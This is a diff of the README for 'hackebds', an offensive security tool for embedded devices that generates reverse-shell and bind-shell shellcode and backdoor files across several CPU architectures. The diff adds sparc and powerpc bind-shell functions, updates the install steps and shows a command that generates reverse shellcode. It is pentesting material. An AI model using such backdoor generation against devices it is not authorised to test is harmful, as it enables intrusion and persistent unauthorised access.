@@ -5,7 +5,7 @@
 
 ## foreword
 
->In the process of penetration and vulnerability mining of embedded devices, many problems have been encountered. One is that some devices do not have telnetd or ssh services to obtain an interactive shell，Some devices are protected by firewall and cannot be connected to it in the forward direction Reverse_shell is required, and the other is that memory corruption vulnerabilities such as stack overflow are usually Null bytes are truncated, so it is more troublesome to construct reverse_shellcode, so this tool was developed to exploit the vulnerability. This tool is developed based on the PWN module and currently uses the python2 language，**Has been updated to python3，Please use this tool in python3.6 version or higher as much as possible**
+>In the process of penetration and vulnerability mining of embedded devices, many problems have been encountered. One is that some devices do not have telnetd or ssh services to obtain an interactive shell，Some devices are protected by firewall and cannot be connected to it in the forward direction Reverse_shell is required, and the other is that memory corruption vulnerabilities such as stack overflow are usually Null bytes are truncated, so it is more troublesome to construct reverse_shellcode, so this tool was developed to exploit the vulnerability. This tool is developed based on the PWN module and currently uses the python2 language，**Has been updated to python3**
 
 ## fuction
 
@@ -35,10 +35,10 @@ This tool is embedded in the security test of the device. There are two main fun
 
 ## install
 
-pip download
+pip download（Use the command line need sudo）
 
 ```
-pip install -U hackebds
+sudo pip(3) install -U hackebds
 ```
 （If you want this tool to run on a MacOS system, you need to include python/bin in the bashrc environment variable）
 ```
@@ -61,7 +61,7 @@ Please install the corresponding binutils environment before use
 expample:
 
 ```
-Ubuntu:
+Ubuntu（debian）:
   apt search binutils | grep arm（You can replace it here）
   apt install binutils-arm-linux-gnueabi/hirsute
  MacOS:
@@ -71,7 +71,7 @@ Ubuntu:
 
 1. Use the command line to generate the backdoor file name, shellcode, bindshell, etc
 
-   ![image-20221102192550052](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102192550052.png)
+   ![image-20221206180431454](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png)
 
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
@@ -114,6 +114,8 @@ Ubuntu:
 >>> aarch64_ bind_ shell(listen_port, passwd)
 >>> mips_bind_shell(listen_port, passwd)
 >>> mipsel_bind_shell(listen_port, passwd)
+>>> sparc_bind_shell(listen_port, passwd)
+>>> powerpc_bind_shell(listen_port, passwd)
 ```
 
 （Note that the maximum password length is 4 characters for x86（32bits） and 8 characters for x64（64bits））
@@ -208,6 +210,8 @@ Allwinner(全志)V3s
 Armv8:
 Qualcomm Snapdragon 660
 
+Powerpc, sparc: emu
+
 
 ## :beer:enjoy hacking
 
@@ -232,6 +236,8 @@ Qualcomm Snapdragon 660
 
  2022.11.2 Joined aarch64_ bind_ shell
  2022.11.2 Support command line generation backdoor and shell code, characterized by light, small, efficient and fast
+
+ 2022.12.6 0.2.8 Add sparc_bind_shell && powerpc_bind_shell ，fix some bug
 
 ## vul fix
 
